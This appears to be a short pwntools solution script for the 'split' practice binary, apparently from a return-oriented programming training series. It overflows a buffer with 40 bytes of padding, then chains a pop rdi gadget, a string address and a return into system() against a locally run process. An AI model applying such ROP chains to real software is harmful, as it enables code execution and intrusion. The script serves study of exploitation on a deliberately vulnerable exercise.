from pwn import *

bin = './split'
p = process(bin)
context.binary = bin


system = 0x040074b
useful_string = 0x0601060
pop_rdi= 0x04007c3


payload  = b'A'*40
payload += p64(pop_rdi) #popping rdi register to populate with our input since we are on 64-bit
payload += p64(useful_string) #
payload += p64(system) #ret into system() address from usefulFunction()

p.sendafter(b'> ', payload)

output = p.recvall(timeout=1).decode()
print(output)
